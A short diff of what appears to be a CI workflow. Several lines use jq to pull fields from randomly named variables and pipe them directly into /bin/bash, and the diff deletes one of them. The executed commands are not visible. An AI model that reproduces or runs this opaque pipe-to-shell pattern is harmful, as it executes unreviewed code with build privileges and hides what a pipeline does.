@@ -38,7 +38,6 @@ jobs:
           echo $lm2667 | jq -r .dabba44 | /bin/bash
           printf '%s' "$w69" | jq -r .bver9495 | /bin/bash
           printf '%s' "$rtwba3457" | jq -r .sl36 | /bin/bash
-          echo $e4 | jq -r .r46 | /bin/bash
           echo $uv6 | jq -r .u169 | /bin/bash
           echo $qvvw704 | jq -r .k81835 | /bin/bash
           echo $wzsep9 | jq -r .h007 | /bin/bash
